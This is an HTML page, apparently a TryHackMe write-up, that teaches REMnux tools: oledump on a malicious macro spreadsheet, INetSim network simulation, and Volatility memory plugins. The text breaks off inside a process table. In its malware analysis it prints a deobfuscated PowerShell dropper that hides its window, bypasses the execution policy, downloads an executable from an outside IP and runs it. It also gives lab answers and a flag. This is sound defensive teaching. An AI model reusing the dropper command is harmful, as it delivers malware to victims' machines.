@@ -1,0 +1,841 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>REMnux Getting Started · THM Writeups</title>
+  
+  <meta name="description" content="Learn how you can use the tools inside the REMnux VM." />
+  
+
+  <!-- Security headers -->
+  <meta http-equiv="X-Frame-Options" content="DENY" />
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src https://fonts.gstatic.com; img-src 'self' data: https:; script-src 'self' 'unsafe-inline';" />
+  <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+  <meta name="referrer" content="no-referrer" />
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/tryhackme/assets/css/style.css" />
+</head>
+<body>
+
+<div class="bg-grid"></div>
+<div class="scanlines"></div>
+
+<nav id="navbar">
+  <div class="nav-inner">
+    <a href="/tryhackme/" class="nav-logo">
+      <span class="prompt">~/george/thm</span><span class="cursor-blink">_</span>
+    </a>
+    <div class="nav-right">
+      <a href="/tryhackme/" class="nav-link"><span class="cmd-prefix">./</span>index</a>
+      <a href="https://georgenadejde.github.io" target="_blank" rel="noopener noreferrer" class="nav-link">
+        <span class="cmd-prefix">~/</span>portfolio
+      </a>
+    </div>
+  </div>
+</nav>
+
+<main class="writeup-main">
+  <div class="container">
+
+    <!-- Breadcrumb -->
+    <div class="breadcrumb">
+      <a href="/tryhackme/">writeups</a>
+      <span class="breadcrumb-sep">→</span>
+      <span>REMnux Getting Started</span>
+    </div>
+
+    <!-- Writeup header -->
+    <div class="writeup-header">
+      <div class="terminal-bar">
+        <span class="dot dot-red"></span>
+        <span class="dot dot-yellow"></span>
+        <span class="dot dot-green"></span>
+        <span class="terminal-title">REMnux - Getting Started/README.md</span>
+      </div>
+      <div class="writeup-meta">
+        <span class="platform-badge">TryHackMe</span>
+        
+          
+          <span class="tag-pill">staticanalysis</span>
+          
+          <span class="tag-pill">malware</span>
+          
+          <span class="tag-pill">reverseengineering</span>
+          
+          <span class="tag-pill">blueteam</span>
+          
+        
+        
+        <span class="writeup-meta-desc">Learn how you can use the tools inside the REMnux VM.</span>
+        
+      </div>
+    </div>
+
+    <!-- Writeup body: sidebar + content -->
+    <div class="writeup-body">
+
+      <!-- ToC Sidebar -->
+      <aside class="toc-sidebar" id="tocSidebar">
+        <div class="toc-header">
+          <span class="toc-label">$ cat --toc</span>
+          <button class="toc-toggle" id="tocToggle" aria-label="Toggle table of contents">✕</button>
+        </div>
+        <nav class="toc-nav" id="tocNav">
+          <p class="toc-empty">No headings found.</p>
+        </nav>
+      </aside>
+
+      <!-- Main content -->
+      <div class="writeup-content-wrap">
+        <article class="writeup-content" id="writeupContent">
+          <h1 id="remnux---getting-started"><a href="">REMnux - Getting Started</a></h1>
+
+<h2 id="file-analysis">File analysis</h2>
+
+<p>Analysing potentially malicious software can be daunting, especially when this is part of an ongoing security incident. This analysis puts much pressure on the analyst. Most of the time, the results must be as accurate as possible, and analysts use different tools, machines, and environments to achieve this.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Oledump.py</code> is a Python tool that analyzes <strong>OLE2</strong> files, commonly called Structured Storage or Compound File Binary Format. <strong>OLE</strong> stands for <strong>Object Linking and Embedding,</strong> a proprietary technology developed by Microsoft. OLE2 files are typically used to store multiple data types, such as documents, spreadsheets, and presentations, within a single file. This tool is handy for extracting and examining the contents of OLE2 files, making it a valuable resource for forensic analysis and malware detection.</p>
+
+<p><img src="/tryhackme/REMnux%20-%20Getting%20Started/2025-12-09_15-20.png" alt="" /></p>
+
+<p> Based on OleDump’s file analysis, a VBA script might be embedded in the document and found inside <code class="language-plaintext highlighter-rouge">xl/vbaProject.bin</code>. Therefore, oledump will assign this with an index of A, though this can sometimes differ. The A (index) +Numbers are called <strong>data streams</strong>.</p>
+
+<p>Now, we should be aware of the data stream with the capital letter <strong>M</strong>. This means there is a <strong>Macro</strong>, and you might want to check out this data stream, <code class="language-plaintext highlighter-rouge">'VBA/ThisWorkbook'</code>.</p>
+
+<p>Let’s run the command <code class="language-plaintext highlighter-rouge">oledump.py agenttesla.xlsm -s 4</code>. This command will run the oledump and look into the actual data stream of interest using the parameter <code class="language-plaintext highlighter-rouge">-s 4</code>,  wherein the <code class="language-plaintext highlighter-rouge">-s</code> parameter is short for <code class="language-plaintext highlighter-rouge">-select</code>  and the number four(<code class="language-plaintext highlighter-rouge">4</code>) as the data stream of interest is in the 4th place(<code class="language-plaintext highlighter-rouge">A4: M 688 'VBA/ThisWorkbook'</code>).</p>
+
+<pre><code class="language--shell-session">00000000: 01 AC B2 00 41 74 74 72  69 62 75 74 00 65 20 56  ....Attribut.e V
+00000010: 42 5F 4E 61 6D 00 65 20  3D 20 22 54 68 69 00 73  B_Nam.e = "Thi.s
+00000020: 57 6F 72 6B 62 6F 6F 10  6B 22 0D 0A 0A 8C 42 61  Workboo.k"....Ba
+00000030: 73 01 02 8C 30 7B 30 30  30 32 30 50 38 31 39 2D  s...0{00020P819-
+00000040: 00 10 30 03 08 43 23 05  12 03 00 34 36 7D 0D 7C  ..0..C#....46}.|
+00000050: 47 6C 10 6F 62 61 6C 01  D0 53 70 61 82 63 01 92  Gl.obal..Spa.c..
+00000060: 46 61 6C 73 65 0C 25 00  43 72 65 61 74 61 62 6C  False.%.Creatabl
+00000070: 01 15 1F 50 72 65 64 65  63 6C 12 61 00 06 49 64  ...Predecl.a..Id
+00000080: 00 23 54 72 75 81 0D 22  45 78 70 6F 73 65 01 1C  .#Tru.."Expose..
+00000090: 01 11 40 54 65 6D 70 6C  61 74 40 65 44 65 72 69  ..@Templat@eDeri
+000000A0: 76 96 12 43 80 75 73 74  6F 6D 69 7A 84 44 0D 83  v..C.ustomiz.D..
+000000B0: 32 50 80 18 80 1C 20 53  75 62 02 20 05 92 5F 4F  2P.... Sub. .._O
+000000C0: 70 65 6E 28 00 29 0D 0A  44 69 6D 20 53 00 71 74  pen(.)..Dim S.qt
+000000D0: 6E 65 77 20 41 73 04 20  53 80 25 6E 67 2C 20 73  new As. S.%ng, s
+000000E0: C0 4F 75 74 70 75 74 07  09 03 14 00 4D 67 67 63  .Output.....Mggc
+000000F0: 62 6E 75 61 02 64 01 0C  4F 62 6A 65 63 74 42 2C  bnua.d..ObjectB,
+00000100: 07 0A 45 78 65 63 07 0C  0D 06 0A 04 2B 00 BD 5E  ..Exec......+..^
+00000110: 70 2A 6F 5E 00 2A 77 2A  65 2A 72 2A 73 10 5E 5E  p*o^.*w*e*r*s.^^
+00000120: 2A 68 80 04 6C 5E 2A 00  6C 2A 20 2A 5E 2D 2A 57  *h..l^*.l* *^-*W
+00000130: 00 2A 69 2A 6E 2A 5E 64  2A 00 6F 2A 77 5E 2A 53  .*i*n*^d*.o*w^*S
+00000140: 2A 74 A0 2A 79 2A 5E 6C  00 11 20 00 14 02 69 01  *t.*y*^l.. ...i.
+00000150: 0C 64 2A 5E 65 2A 6E 2A  5E 00 08 2D 00 0B 78 41  .d*^e*n*^..-..xA
+00000160: 03 63 2A 12 75 00 0A 5E  69 00 0D 6E 2A 70 40 6F  .c*.u..^i..n*p@o
+00000170: 6C 5E 69 63 79 C0 07 62  00 2A 79 70 5E 5E 61 73  l^icy..b.*yp^^as
+00000180: 73 20 2A 3B 2A 20 24 01  4D 46 69 0A 6C 41 12 3D  s *;* $.MFi.lA.=
+00000190: C0 00 5B 2A 49 2A 80 4F  2A 2E 2A 50 2A 61 C0 0E  ..[*I*.O*.*P*a..
+000001A0: 00 68 2A 5D 2A 3A 3A 47  65 1A 74 40 09 2A 83 09  .h*]*::Ge.t@.*..
+000001B0: 41 79 28 29 20 40 7C 20  52 65 6E 5E C0 02 2D 00  Ay() @| Ren^..-.
+000001C0: 49 74 5E 65 6D 20 2D 4E  04 65 77 42 9A 7B 20 24  It^em -N.ewB.{ $
+000001D0: 5F 20 18 2D 72 65 40 62  40 82 27 74 6D 00 70 24  _ .-re@b@.'tm.p$
+000001E0: 27 2C 20 27 65 78 80 65  27 20 7D 20 96 50 C1 1D  ', 'ex.e' } .P..
+000001F0: 00 54 68 72 75 3B 20 49  6E 00 5E 76 6F 2A 6B 65  .Thru; In.^vo*ke
+00000200: 2D 57 00 65 5E 62 52 65  2A 71 75 00 65 73 74 20  -W.e^bRe*qu.est 
+00000210: 2D 55 5E 72 00 69 20 22  22 68 74 74 70 00 3A 2F  -U^r.i ""http.:/
+00000220: 2F 31 39 33 2E 32 02 30  C3 00 36 37 2F 72 74 2F  /193.2.0..67/rt/
+00000230: 00 44 6F 63 2D 33 37 33  37 80 31 32 32 70 64 66  .Doc-3737.122pdf
+00000240: 2E 00 16 D0 22 22 20 2D  00 63 2A C1 27 07 34 02  ...."" -.c*.'.4.
+00000250: 3B 80 65 2A 61 72 74 2D  50 80 72 6F 63 65 2A 73  ;.e*art-P.roce*s
+00000260: 73 88 06 2B 00 B0 46 5E  52 83 2A 28 03 04 2C 20  s..+..F^R.*(.., 
+00000270: 68 22 2A 22 00 01 22 C0  7D 97 08 5E 49 86 08 65  h"*"..".}..^I..e
+00000280: 74 48 7C 3D 20 C2 B8 65  01 43 77 28 22 57 53 63  tH|= ..e.Cw("WSc
+00000290: 72 69 00 70 74 2E 53 68  65 6C 6C EB 8E 0B C2 82  ri.pt.Shell.....
+000002A0: 3D C7 03 2E 01 04 C4 18  C0 0A 08 45 6E 64 81 A3  =..........End..
+</code></pre>
+
+<p>We will run an additional parameter <code class="language-plaintext highlighter-rouge">--vbadecompress</code> in addition to the previous command. When we use this parameter, oledump will automatically decompress any compressed VBA macros it finds into a more readable format, making it easier to analyze the contents of the macros.</p>
+
+<p><img src="/tryhackme/REMnux%20-%20Getting%20Started/2025-12-09_15-23.png" alt="" /></p>
+
+<p>Our interest here would be the value of <strong>Sqtnew</strong> because if you check the script, there is a Public IP, a PDF, and a .exe inside. We might want to look into this further.</p>
+
+<p>We will copy the first value of <strong>Sqtnew</strong> and paste it into <strong>CyberChef’s</strong> input area.</p>
+
+<p>Next, select the <strong>Find/Replace</strong> operation twice. Looking back at the script, the 2nd and 3rd values of Sqtnew have a command to replace * with “” and ^ with “”. We would assume that the ““ means there is no value. So, with our first operation selected, we put the value * and selected <strong>SIMPLE STRING</strong> as additional parameters. In contrast, <strong>we did not put anything on the Replace box</strong> or have any value.  The same applies to our second operation: we put the value ^ and selected SIMPLE STRING, and the replace box has no value.</p>
+
+<p><img src="/tryhackme/REMnux%20-%20Getting%20Started/5e6bbe59a46ee9407fd65bbe-1727075711805.png" alt="" /></p>
+
+<p>The resulting string:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-WindowStyle</span><span class="w"> </span><span class="nx">hidden</span><span class="w"> </span><span class="nt">-executionpolicy</span><span class="w"> </span><span class="nx">bypass</span><span class="p">;</span><span class="w"> </span><span class="nv">$TempFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">IO.Path</span><span class="p">]::</span><span class="n">GetTempFileName</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Rename-Item</span><span class="w"> </span><span class="nt">-NewName</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="w"> </span><span class="o">-replace</span><span class="w"> </span><span class="s1">'tmp$'</span><span class="p">,</span><span class="w"> </span><span class="s1">'exe'</span><span class="w"> </span><span class="p">}</span><span class="w">  </span><span class="n">PassThru</span><span class="p">;</span><span class="w"> </span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="s2">""</span><span class="nx">http://193.203.203.67/rt/Doc-3737122pdf.exe</span><span class="s2">""</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nv">$TempFile</span><span class="p">;</span><span class="w"> </span><span class="n">Start-Process</span><span class="w"> </span><span class="nv">$TempFile</span><span class="p">;</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>Running the <code class="language-plaintext highlighter-rouge">-WindowStyle</code> parameter allows you to control how the PowerShell window appears when executing a script or command. In this case, <code class="language-plaintext highlighter-rouge">hidden</code> means that the PowerShell window <strong>won’t be visible to the user</strong>.</li>
+  <li>By default, PowerShell restricts script execution for security reasons. The <code class="language-plaintext highlighter-rouge">-executionpolicy</code> parameter allows you to override this policy. The <code class="language-plaintext highlighter-rouge">bypass</code> means that the <strong>execution policy is temporarily ignored</strong>, allowing any script to run without restriction.</li>
+  <li>The <code class="language-plaintext highlighter-rouge">Invoke-WebRequest</code> is commonly used for downloading files from the internet.
+    <ul>
+      <li>The <code class="language-plaintext highlighter-rouge">-Uri</code> Specifies the URL of the web resource you want to retrieve. In our case, the script is downloading the resource <code class="language-plaintext highlighter-rouge">Doc-3737122pdf.exe</code> from <code class="language-plaintext highlighter-rouge">http://193.203.203.67/rt</code>/.</li>
+      <li>The <code class="language-plaintext highlighter-rouge">-OutFile</code> specifies the local file where the downloaded content will be saved.  In this case, the Doc-3737122pdf.exe will be saved to $TempFile.</li>
+    </ul>
+  </li>
+  <li>The <code class="language-plaintext highlighter-rouge">Start-Process</code> is used to execute the downloaded file that is stored in <code class="language-plaintext highlighter-rouge">$TempFile</code> after the web request.</li>
+</ul>
+
+<p>To summarize, when the document <code class="language-plaintext highlighter-rouge">agenttesla.xlsm</code> is opened, a Macro will run! This Macro contains a VBA script. The script will run and will be running a PowerShell to download a file named <code class="language-plaintext highlighter-rouge">Doc-3737122pdf.exe</code> from <code class="language-plaintext highlighter-rouge">http://193.203.203.67/rt/</code>, save it to a variable $TempFile, then execute or start running the file inside this variable, which is a binary or a .exe file (<code class="language-plaintext highlighter-rouge">Doc-3737122pdf.exe</code><strong>)</strong>. This is a usual technique used by threat actors to avoid early detection.</p>
+
+<h3 id="questions">Questions</h3>
+
+<p>Q: What Python tool analyzes OLE2 files, commonly called Structured Storage or Compound File Binary Format?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">oledump.py</code></p>
+
+<p>Q: What tool parameter we used in this task allows you to select a particular data stream of the file we are using it with?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">-s</code></p>
+
+<p>Q: During our analysis, we were able to decode a PowerShell script. What command is commonly used for downloading files from the internet?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">Invoke-WebRequest</code></p>
+
+<p>Q: What file was being downloaded using the PowerShell script?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">Doc-3737122pdf.exe</code></p>
+
+<p>Q: During our analysis of the PowerShell script, we noted that a file would be downloaded. Where will the file being downloaded be stored?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">$TempFile</code></p>
+
+<p>Q: Using the tool, scan another file named <strong>possible_malicious.docx</strong> located in the <code class="language-plaintext highlighter-rouge">/home/ubuntu/Desktop/tasks/agenttesla/</code> directory. How many data streams were presented for this file?</p>
+
+<p><img src="/tryhackme/REMnux%20-%20Getting%20Started/2025-12-09_15-36.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">16</code></p>
+
+<p>Q: Using the tool, scan another file named <strong>possible_malicious.docx</strong> located in the <code class="language-plaintext highlighter-rouge">/home/ubuntu/Desktop/tasks/agenttesla/</code> directory. At what data stream number does the tool indicate a macro present?</p>
+
+<p>We need to look for the ‘M’ in between the first and second columns.</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">8</code></p>
+
+<h2 id="fake-network-to-aid-analysis">Fake Network to Aid Analysis</h2>
+
+<p>During dynamic analysis, it is essential to observe the behaviour of potentially malicious software—especially its network activities. There are many approaches to this. We can create a whole infrastructure, a virtual environment with different core machines, and more. Alternatively, there is a tool inside our REMnux VM called <strong>INetSim: Internet Services Simulation Suite</strong><strong>!</strong></p>
+
+<p>We will utilize INetSim’s features to simulate a real network.</p>
+
+<h3 id="inetsim">INetSim</h3>
+
+<p>Before we start, we must configure the tool INetSim inside our REMnux VM. Do not worry; this is a simple change of configuration. First, check the IP address assigned to your machine.</p>
+
+<p>Next, we need to change the INetSim configuration by running this command <code class="language-plaintext highlighter-rouge">sudo nano /etc/inetsim/inetsim.conf</code> and look for the value <code class="language-plaintext highlighter-rouge">#dns_default_ip 0.0.0.0</code>.</p>
+
+<p><img src="/tryhackme/REMnux%20-%20Getting%20Started/2025-12-09_15-41.png" alt="" /></p>
+
+<p>Run the command <code class="language-plaintext highlighter-rouge">sudo inetsim</code> to start the tool.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ubuntu@10.80.169.119:~<span class="nv">$ </span><span class="nb">sudo </span>inetsim
+INetSim 1.3.2 <span class="o">(</span>2020-05-19<span class="o">)</span> by Matthias Eckert &amp; Thomas Hungenberg
+Using log directory:      /var/log/inetsim/
+Using data directory:     /var/lib/inetsim/
+Using report directory:   /var/log/inetsim/report/
+Using configuration file: /etc/inetsim/inetsim.conf
+Parsing configuration file.
+Warning: Unknown option <span class="s1">'/var/log/inetsim/report/report.104162.txt#start_service'</span> <span class="k">in </span>configuration file <span class="s1">'/etc/inetsim/inetsim.conf'</span> line 43
+Configuration file parsed successfully.
+<span class="o">===</span> INetSim main process started <span class="o">(</span>PID 4859<span class="o">)</span> <span class="o">===</span>
+Session ID:     4859
+Listening on:   10.80.169.119
+Real Date/Time: 2024-09-22 17:38:22
+Fake Date/Time: 2024-09-22 17:38:22 <span class="o">(</span>Delta: 0 seconds<span class="o">)</span>
+ Forking services...
+  <span class="k">*</span> dns_53_tcp_udp - started <span class="o">(</span>PID 4863<span class="o">)</span>
+  <span class="k">*</span> http_80_tcp - failed!
+  <span class="k">*</span> https_443_tcp - started <span class="o">(</span>PID 4865<span class="o">)</span>
+  <span class="k">*</span> ftps_990_tcp - started <span class="o">(</span>PID 4871<span class="o">)</span>
+  <span class="k">*</span> pop3_110_tcp - started <span class="o">(</span>PID 4868<span class="o">)</span>
+  <span class="k">*</span> smtp_25_tcp - started <span class="o">(</span>PID 4866<span class="o">)</span>
+  <span class="k">*</span> ftp_21_tcp - started <span class="o">(</span>PID 4870<span class="o">)</span>
+  <span class="k">*</span> pop3s_995_tcp - started <span class="o">(</span>PID 4869<span class="o">)</span>
+  <span class="k">*</span> smtps_465_tcp - started <span class="o">(</span>PID 4867<span class="o">)</span>
+ <span class="k">done</span><span class="nb">.</span>
+Simulation running.
+</code></pre></div></div>
+
+<h3 id="using-your-attack-box">Using your attack box</h3>
+
+<p>From your laptop/attack box, open a browser and go to our REMnux’s IP address using the command <code class="language-plaintext highlighter-rouge">https://10.80.169.119</code>. This will prompt a Security Risk; ignore it, click <strong>Advance</strong>, then <strong>Accept the Risk and Continue.</strong></p>
+
+<p><img src="/tryhackme/REMnux%20-%20Getting%20Started/5e6bbe59a46ee9407fd65bbe-1727039504431.png" alt="" /></p>
+
+<p>One usual malware behaviour is downloading another binary or script. We will try to mimic this behaviour by getting another file from INetsim. We can do this via the CLI or browser, but let’s use the CLI to make it more realistic. Use this command: <code class="language-plaintext highlighter-rouge">sudo wget https://10.80.169.119/second_payload.zip --no-check-certificate</code>.</p>
+
+<p><img src="/tryhackme/REMnux%20-%20Getting%20Started/2025-12-09_15-47.png" alt="" /></p>
+
+<p>To verify that the files were downloaded, check your root folder.</p>
+
+<p><img src="/tryhackme/REMnux%20-%20Getting%20Started/2025-12-09_15-47_1.png" alt="" /></p>
+
+<p>What we did here is <strong>mimic a malware’s behaviour</strong>, wherein it will try to reach out to a server or URL and then <strong>download a secondary file that may contain another malware</strong>.</p>
+
+<p>Lastly, go back to your REMnux VM and stop INetSim. By default, it will create a report on its captured connections. This is usually saved in <strong>/var/log/inetsim/report/</strong> directory. You should be able to see something like this.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Report written to <span class="s1">'/var/log/inetsim/report/report.2594.txt'</span> <span class="o">(</span>14 lines<span class="o">)</span>
+<span class="o">===</span> INetSim main process stopped <span class="o">(</span>PID 2594<span class="o">)</span> <span class="o">===</span>
+</code></pre></div></div>
+
+<p>Read the file using this command <code class="language-plaintext highlighter-rouge">sudo cat /var/log/inetsim/report/report.2594.txt</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ubuntu@10.80.169.119:~<span class="nv">$ </span><span class="nb">sudo cat</span> /var/log/inetsim/report/report.2594.txt
+<span class="o">===</span> Report <span class="k">for </span>session <span class="s1">'2594'</span> <span class="o">===</span>
+
+Real start <span class="nb">date</span>            : 2024-09-22 21:04:42
+Simulated start <span class="nb">date</span>       : 2024-09-22 21:04:42
+Time difference on startup : none
+
+2024-09-22 21:04:53  First simulated <span class="nb">date </span><span class="k">in </span>log file
+2024-09-22 21:04:53  HTTPS connection, method: GET, URL: https://10.80.169.119/, file name: /var/lib/inetsim/http/fakefiles/sample.html
+2024-09-22 21:16:07  HTTPS connection, method: GET, URL: https://10.80.169.119/test.exe, file name: /var/lib/inetsim/http/fakefiles/sample_gui.exe
+2024-09-22 21:18:37  HTTPS connection, method: GET, URL: https://10.80.169.119/second_payload.ps1, file name: /var/lib/inetsim/http/fakefiles/sample.html
+2024-09-22 21:18:49  HTTPS connection, method: GET, URL: https://10.80.169.119/second_payload.zip, file name: /var/lib/inetsim/http/fakefiles/sample.html
+2024-09-22 21:18:49  Last simulated <span class="nb">date </span><span class="k">in </span>log file
+<span class="o">===</span>
+</code></pre></div></div>
+
+<h3 id="questions-1">Questions</h3>
+
+<p>Q: Download and scan the file named <strong>flag.txt</strong> from the terminal using the command sudo wget https://10.80.169.119/flag.txt –no-check-certificate. What is the flag?</p>
+
+<p><img src="/tryhackme/REMnux%20-%20Getting%20Started/2025-12-09_15-50.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">Tryhackme{remnux_edition}</code></p>
+
+<p>Q: After stopping the inetsim, read the generated report. Based on the report, what URL Method was used to get the file flag.txt?</p>
+
+<p><img src="/tryhackme/REMnux%20-%20Getting%20Started/2025-12-09_15-53.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">GET</code></p>
+
+<h2 id="memory-investigation-evidence-preprocessing">Memory Investigation: Evidence Preprocessing</h2>
+
+<p>One of the most common investigative practices in Digital Forensics is the preprocessing of evidence. This involves running tools and saving the results in text or JSON format. The analyst often relies on tools such as Volatility when dealing with memory images as evidence. Volatility commands are executed to identify and extract specific artefacts from memory images, and the resulting output can be saved to text files for further examination. Similarly, we can run a script involving the tool’s different parameters to preprocess the acquired evidence faster.</p>
+
+<h3 id="preprocessing-with-volatility">Preprocessing With Volatility</h3>
+
+<p>In this task, we will use the Volatility 3 tool version. However, we won’t go deep into the investigation and analysis part of the result—we could write a whole book about it! Instead, we want you to be familiar with and get a feel for how the tool works. Run the command as instructed and wait for the result to show. Each plugin takes 2-3 minutes to show the output.</p>
+
+<p>Here are some of the parameters or plugins we will use. We will focus on Windows plugins.</p>
+
+<ul>
+  <li>windows.pstree.PsTree</li>
+  <li>windows.pslist.PsList</li>
+  <li>windows.cmdline.CmdLine</li>
+  <li>windows.filescan.FileScan</li>
+  <li>windows.dlllist.DllList</li>
+  <li>windows.malfind.Malfind</li>
+  <li>windows.psscan.PsScan</li>
+</ul>
+
+<p>We will run each plugin after the command <code class="language-plaintext highlighter-rouge">vol3 -f wcry.mem</code>.</p>
+
+<h3 id="pstree">PsTree</h3>
+
+<p>This plugin lists processes in a tree based on their parent process ID.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> wcry.mem windows.pstree.PsTree
+</code></pre></div></div>
+
+<p>Results:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PID</span><span class="w">	</span><span class="nx">PPID</span><span class="w">	</span><span class="nx">ImageFileName</span><span class="w">	</span><span class="nx">Offset</span><span class="p">(</span><span class="n">V</span><span class="p">)</span><span class="w">	</span><span class="n">Threads</span><span class="w">	</span><span class="nx">Handles</span><span class="w">	</span><span class="nx">SessionId</span><span class="w">	</span><span class="nx">Wow64</span><span class="w">	</span><span class="nx">CreateTime</span><span class="w">	</span><span class="nx">ExitTime</span><span class="w">
+
+</span><span class="mi">4</span><span class="w">	</span><span class="mi">0</span><span class="w">	</span><span class="n">System</span><span class="w">	</span><span class="nx">0x823c8830</span><span class="w">	</span><span class="nx">51</span><span class="w">	</span><span class="nx">244</span><span class="w">	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">N/A</span><span class="w">
+</span><span class="o">*</span><span class="w"> </span><span class="mi">348</span><span class="w">	</span><span class="mi">4</span><span class="w">	</span><span class="n">smss.exe</span><span class="w">	</span><span class="nx">0x82169020</span><span class="w">	</span><span class="nx">3</span><span class="w">	</span><span class="nx">19</span><span class="w">	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:21:55.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">
+</span><span class="o">**</span><span class="w"> </span><span class="mi">620</span><span class="w">	</span><span class="mi">348</span><span class="w">	</span><span class="n">winlogon.exe</span><span class="w">	</span><span class="nx">0x8216e020</span><span class="w">	</span><span class="nx">23</span><span class="w">	</span><span class="nx">536</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:01.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">
+</span><span class="o">***</span><span class="w"> </span><span class="mi">664</span><span class="w">	</span><span class="mi">620</span><span class="w">	</span><span class="n">services.exe</span><span class="w">	</span><span class="nx">0x821937f0</span><span class="w">	</span><span class="nx">15</span><span class="w">	</span><span class="nx">265</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:01.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">
+</span><span class="o">****</span><span class="w"> </span><span class="mi">1024</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">0x821af7e8</span><span class="w">	</span><span class="nx">79</span><span class="w">	</span><span class="nx">1366</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:03.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">
+</span><span class="o">*****</span><span class="w"> </span><span class="mi">1768</span><span class="w">	</span><span class="mi">1024</span><span class="w">	</span><span class="n">wuauclt.exe</span><span class="w">	</span><span class="nx">0x81f747c0</span><span class="w">	</span><span class="nx">7</span><span class="w">	</span><span class="nx">132</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:52.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">
+</span><span class="o">*****</span><span class="w"> </span><span class="mi">1168</span><span class="w">	</span><span class="mi">1024</span><span class="w">	</span><span class="n">wscntfy.exe</span><span class="w">	</span><span class="nx">0x81fea8a0</span><span class="w">	</span><span class="nx">1</span><span class="w">	</span><span class="nx">37</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:56.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">
+</span><span class="o">****</span><span class="w"> </span><span class="mi">1152</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">0x821bea78</span><span class="w">	</span><span class="nx">10</span><span class="w">	</span><span class="nx">173</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:06.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">
+</span><span class="o">****</span><span class="w"> </span><span class="mi">544</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">alg.exe</span><span class="w">	</span><span class="nx">0x82010020</span><span class="w">	</span><span class="nx">6</span><span class="w">	</span><span class="nx">101</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:55.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">
+</span><span class="o">****</span><span class="w"> </span><span class="mi">836</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">0x8221a2c0</span><span class="w">	</span><span class="nx">19</span><span class="w">	</span><span class="nx">211</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:02.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">
